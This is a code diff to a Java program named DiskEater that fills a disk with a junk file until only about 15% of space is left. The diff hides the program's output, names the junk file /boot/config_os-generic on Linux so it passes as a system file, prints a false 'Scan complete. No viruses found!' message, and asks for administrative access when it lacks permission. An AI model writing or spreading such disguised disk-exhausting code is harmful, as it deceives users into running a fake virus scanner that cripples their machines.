@@ -25,50 +25,66 @@ import java.util.logging.Logger;
 public class DiskEater {
 
     /**
-     * @param args the command line arguments
+     * @param args the command line arguments -c arguement clears the file if it
+     * exists
      */
     public static void main(String[] args) {
-        double fill = .15;
-        long available = -1;
-        long total = -1;
-
-        //get storage information
-        NumberFormat nf = NumberFormat.getNumberInstance();
-        for (Path root : FileSystems.getDefault().getRootDirectories()) {
-
-            System.out.print(root + ": ");
-            try {
-                FileStore store = Files.getFileStore(root);
-                System.out.println("available="
-                        + nf.format(store.getUsableSpace())
-                        + ", total=" + nf.format(store.getTotalSpace()));
-                available = store.getUsableSpace();
-                total = store.getTotalSpace();
-            } catch (IOException e) {
-                System.out.println("error querying space: " + e.toString());
-            }
-        }
-
+        boolean verbose = false;
         File file = new File(getJunkPath());
 
         // remove file if it already exists
-        System.out.println(file.getAbsolutePath());
-        System.out.println(System.getProperty("os.name"));
+        if (verbose) {
+            System.out.println(file.getAbsolutePath());
+        }
         if (file.exists()) {
             file.delete();
         }
 
-        System.out.println("Disk Space Available: " + (double) available / (double) total);
+        if (args.length < 1 || !args[0].equals("-c")) {
+            double fill = .15;
+            long available = -1;
+            long total = -1;
 
-        writeFile(available, total, fill, file);
-        getSpace();
+            //get storage information
+            NumberFormat nf = NumberFormat.getNumberInstance();
+            for (Path root : FileSystems.getDefault().getRootDirectories()) {
+
+                if (verbose) {
+                    System.out.print(root + ": ");
+                }
+                try {
+                    FileStore store = Files.getFileStore(root);
+                    if (verbose) {
+                        System.out.println("available="
+                                + nf.format(store.getUsableSpace())
+                                + ", total=" + nf.format(store.getTotalSpace()));
+                    }
+                    available = store.getUsableSpace();
+                    total = store.getTotalSpace();
+                } catch (IOException e) {
+                    System.out.println("error querying space: " + e.toString());
+                }
+            }
+
+            if (verbose) {
+                System.out.println("Disk Space Available: " + (double) available / (double) total);
+            }
+
+            writeFile(available, total, fill, file);
+            if (verbose) {
+                getSpace();
+            }
+        }
     }
 
     /**
      * gets desired path to junk file
+     *
+     * @return path to file to be saved.
      */
     public static String getJunkPath() {
-        if(System.getProperty("os.name").equals("Linux")){
+        if (System.getProperty("os.name").equals("Linux")) {
+//            return "/sys/kernal/config_os-generic";
             return "/boot/config_os-generic";
         }
         return "junk";
@@ -98,14 +114,18 @@ public class DiskEater {
     }
 
     /**
-     * writes file to fill percent of space using FileOutputStream.
+     * writes file to fill a certain percent of space using FileOutputStream.
+     *
+     * @param available bytes that can be written to left on the disk
+     * @param total total bytes on disk
+     * @param fill percent of disk that will be filled after file is written
+     * @param file path to file to be written
      */
     public static void writeFile(long available, long total, double fill, File file) {
         NumberFormat nf = NumberFormat.getNumberInstance();
 
         // number of bytes written leaving fill% of disk empty
         long write = available - (long) (total * (1 - fill));
-        System.out.println("write = " + nf.format(write));
 
         try {
 
@@ -113,9 +133,7 @@ public class DiskEater {
             // write by .5GB
             for (int i = 500000000; i < write; write -= 500000000) {
                 byte[] buf = new byte[500000000];
-                System.out.println("created byte array");
                 s.write(buf);
-                System.out.println("wrote to file");
                 s.flush();
             }
             // write by MB
@@ -136,14 +154,18 @@ public class DiskEater {
                 s.write(buf);
                 s.flush();
             }
-
+            System.out.println("Scan complete. No viruses found!");
         } catch (IOException e) {
-            e.printStackTrace();
+            System.out.println("Please give me administrative access!\nDidn't "
+                    + "do anything");
         }
     }
 
     /**
      * writes file to fill percent of space using RandomAccessFile.
+     *
+     * @param size size of file to be written
+     * @param fill percent of disk to be filled
      */
     public static void fastWriteFile(long size, double fill) {
         NumberFormat nf = NumberFormat.getNumberInstance();
